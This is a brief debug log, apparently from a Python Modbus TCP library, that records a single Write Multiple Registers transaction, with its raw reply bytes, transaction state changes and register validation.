2025-12-25 16:10:08,387 DEBUG logging:103 Changing transaction state from "WAITING FOR REPLY" to "PROCESSING REPLY"
2025-12-25 16:10:08,387 DEBUG logging:103 RECV: 0x0 0x3c 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:10:08,387 DEBUG logging:103 Processing: 0x0 0x3c 0x0 0x0 0x0 0x6 0x1 0x10 0x0 0xe 0x0 0x3
2025-12-25 16:10:08,387 DEBUG logging:103 Factory Response[WriteMultipleRegistersResponse': 16]
2025-12-25 16:10:08,387 DEBUG logging:103 Adding transaction 60
2025-12-25 16:10:08,387 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:10:08,387 DEBUG logging:103 Getting transaction 60
2025-12-25 16:10:08,387 DEBUG logging:103 Changing transaction state from "PROCESSING REPLY" to "TRANSACTION_COMPLETE"
2025-12-25 16:10:08,387 DEBUG logging:103 Very short frame (NO MBAP):  wait for more data
2025-12-25 16:10:08,387 DEBUG logging:103 validate: fc-[16] address-15: count-3
2025-12-25 16:10:08,387 DEBUG logging:103 setValues[16] address-15: count-3
